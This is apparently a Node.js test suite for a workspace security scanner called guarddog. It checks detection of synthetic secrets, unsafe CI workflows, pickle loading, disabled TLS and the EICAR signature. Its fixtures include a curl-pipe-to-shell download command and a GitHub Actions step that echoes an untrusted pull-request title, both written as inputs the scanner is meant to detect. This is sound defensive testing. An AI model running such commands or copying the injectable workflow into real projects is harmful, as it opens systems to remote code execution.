const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
async function fixture(t, files) {
 const root=fs.mkdtempSync(path.join(os.tmpdir(),'guarddog workspace '));
 t.after(()=>fs.rmSync(root,{recursive:true,force:true}));
 for(const [name,text] of Object.entries(files)){const p=path.join(root,name);fs.mkdirSync(path.dirname(p),{recursive:true});fs.writeFileSync(p,text);}
 return {root,scan:(await import('../src/workspace-scan.js')).scanWorkspace};
}
test('workspace detects a credential in hidden developer configuration without exposing it',async t=>{
 const secret='ghp_'+'aB1cD2eF3gH4iJ5kL6mN7oP8qR9sT0uV1wX2';
 const {root,scan}=await fixture(t,{'.vscode/settings.json':JSON.stringify({token:secret})});
 const report=scan(root);
 assert.equal(report.findings.length,1);
 assert.equal(report.findings[0].ruleId,'GD-SECRET-GITHUB');
 assert.equal(report.findings[0].path,'.vscode/settings.json');
 assert.equal(report.status,'findings');
 assert.equal(JSON.stringify(report).includes(secret),false);
});

test('scope boundaries and resource limits cannot produce a clean scan',async t=>{
 const {root,scan}=await fixture(t,{'a.js':'const ok = true;','b.js':'const ok = true;','node_modules/vendor.js':'ignored','deep/x/y.js':'too deep'});
 const report=scan(root,{maxFiles:1});
 assert.equal(report.coverage.complete,false);
 assert.equal(report.exitCode,2);
 assert.ok(report.issues.some(x=>x.code==='file_limit'));
});

test('native layers detect malware test signatures, dangerous code and coding configuration',async t=>{
 const {root,scan}=await fixture(t,{
  'run.sh':'curl https://example.invalid/install.sh | sh',
  'key.pem':'-----BEGIN PRIVATE KEY-----\nsynthetic\n-----END PRIVATE KEY-----',
  '.github/workflows/ci.yml':'permissions: write-all\non: pull_request_target\nrun: echo ${{ github.event.pull_request.title }}',
  'server.py':"pickle.loads(request.body)",
  'config.js':'process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";',
  '.npmrc':'strict-ssl=false'
 });
 const report=scan(root),ids=new Set(report.findings.map(f=>f.ruleId));
 for(const id of ['GD-DOWNLOAD-EXEC','GD-SECRET-PRIVATE-KEY','GD-CI-WRITE-ALL','GD-CI-UNTRUSTED-EXPRESSION','GD-PYTHON-PICKLE-INPUT','GD-TLS-DISABLED','GD-NPM-TLS-DISABLED'])assert.ok(ids.has(id),id);
 assert.equal(report.coverage.complete,true);
});

test('symlinks never traverse outside the selected workspace',async t=>{
 const {root,scan}=await fixture(t,{'safe.txt':'hello'});
 const external=fs.mkdtempSync(path.join(os.tmpdir(),'gd outside '));t.after(()=>fs.rmSync(external,{recursive:true,force:true}));
 fs.writeFileSync(path.join(external,'key.pem'),'-----BEGIN PRIVATE KEY-----');
 fs.symlinkSync(external,path.join(root,'escape'),'dir');
 const report=scan(root);assert.equal(report.findings.length,0);assert.equal(report.coverage.complete,false);assert.equal(report.coverage.filesScanned,1);assert.ok(report.issues.some(x=>x.code==='symlink_skipped'));
});
test('oversized files and depth limits are explicit coverage gaps',async t=>{
 const {root,scan}=await fixture(t,{'large':'x'.repeat(100),'a/b/c.txt':'hello','fine.txt':'ok'});
 const report=scan(root,{maxFileBytes:10,maxDepth:1});
 assert.equal(report.coverage.complete,false);assert.ok(report.issues.some(x=>x.code==='file_size_limit'));assert.ok(report.issues.some(x=>x.code==='depth_limit'));assert.equal(report.exitCode,2);
});
test('default exclusions are declared and include-dependencies makes them scannable',async t=>{
 const {root,scan}=await fixture(t,{'node_modules/x/key.pem':'-----BEGIN PRIVATE KEY-----','safe.txt':'hello'});
 assert.equal(scan(root).findings.length,0);assert.equal(scan(root).coverage.excludedDirectories,1);
 assert.equal(scan(root,{includeDependencies:true}).findings.length,1);
});
test('binary coverage is explicit and test signatures are still recognized',async t=>{
 const marker='EICAR-STANDARD-'+'ANTIVIRUS-TEST-FILE!$H+H*';
 const {root,scan}=await fixture(t,{'data.bin':Buffer.from('\0'+marker)});
 const report=scan(root);assert.equal(report.coverage.binaryFiles,1);assert.equal(report.findings[0].ruleId,'GD-MALWARE-EICAR');
});
test('ordinary application operations do not trigger malicious-code heuristics',async t=>{
 const {root,scan}=await fixture(t,{'app.js':'const token = process.env.API_KEY; fetch(url); fs.readFileSync(file); spawn("git", ["status"]);','app.py':'pickle.loads(trusted_local_cache)'});
 assert.equal(scan(root).findings.length,0);
});
test('empty roots and invalid limits cannot masquerade as protection',async t=>{
 const {root,scan}=await fixture(t,{});assert.equal(scan(root).exitCode,2);assert.throws(()=>scan(root,{maxFiles:NaN}));assert.throws(()=>scan(root,{maxDepth:1000000}));
});
test('fingerprints remain stable across checkout locations',async t=>{
 const a=await fixture(t,{'key.pem':'-----BEGIN PRIVATE KEY-----'}),b=await fixture(t,{'key.pem':'-----BEGIN PRIVATE KEY-----'});
 assert.equal(a.scan(a.root).findings[0].fingerprint,b.scan(b.root).findings[0].fingerprint);
});

test('UTF16 text is scanned rather than silently treated as clean binary',async t=>{
 const secret='ghp_'+'B2'.repeat(18);
 const {root,scan}=await fixture(t,{'settings.json':Buffer.concat([Buffer.from([255,254]),Buffer.from(JSON.stringify({token:secret}),'utf16le')])});
 assert.equal(scan(root).findings[0]?.ruleId,'GD-SECRET-GITHUB');
});
test('secret replacement changes fingerprint while moving unchanged evidence does not',async t=>{
 const {root,scan}=await fixture(t,{'a.js':'const token="ghp_'+'A1'.repeat(18)+'";'});
 const first=scan(root).findings[0];
 fs.writeFileSync(path.join(root,'a.js'),'\nconst token="ghp_'+'A1'.repeat(18)+'";');const moved=scan(root).findings[0];
 assert.equal(first.fingerprint,moved.fingerprint);
 fs.writeFileSync(path.join(root,'a.js'),'\nconst token="ghp_'+'B2'.repeat(18)+'";');assert.notEqual(moved.fingerprint,scan(root).findings[0].fingerprint);
});
test('safe CI environment interpolation does not become a shell injection finding',async t=>{
 const {root,scan}=await fixture(t,{'.github/workflows/a.yml':'steps:\n  - env:\n      TITLE: ${{ github.event.issue.title }}\n    run: printf "%s\\n" "$TITLE"'});
 assert.equal(scan(root).findings.length,0);
});

test('NUL-corrupted dotfile configurations report missing text coverage',async t=>{
 const {root,scan}=await fixture(t,{'.env':Buffer.from('TOKEN=ghp_'+'B2'.repeat(18)+'\0')});
 assert.equal(scan(root).coverage.complete,false);
});
test('private key replacement changes evidence identity',async t=>{
 const {root,scan}=await fixture(t,{'key.pem':'-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----'});
 const before=scan(root).findings[0].fingerprint;
 fs.writeFileSync(path.join(root,'key.pem'),'-----BEGIN PRIVATE KEY-----\nBBBB\n-----END PRIVATE KEY-----');
 assert.notEqual(scan(root).findings[0].fingerprint,before);
});
test('CI run blocks retain detection inside nested shell indentation',async t=>{
 const {root,scan}=await fixture(t,{'.github/workflows/a.yml':'steps:\n  - run: |\n      if true; then\n        echo "${{ github.event.pull_request.title }}"\n      fi'});
 assert.equal(scan(root).findings[0]?.ruleId,'GD-CI-UNTRUSTED-EXPRESSION');
});
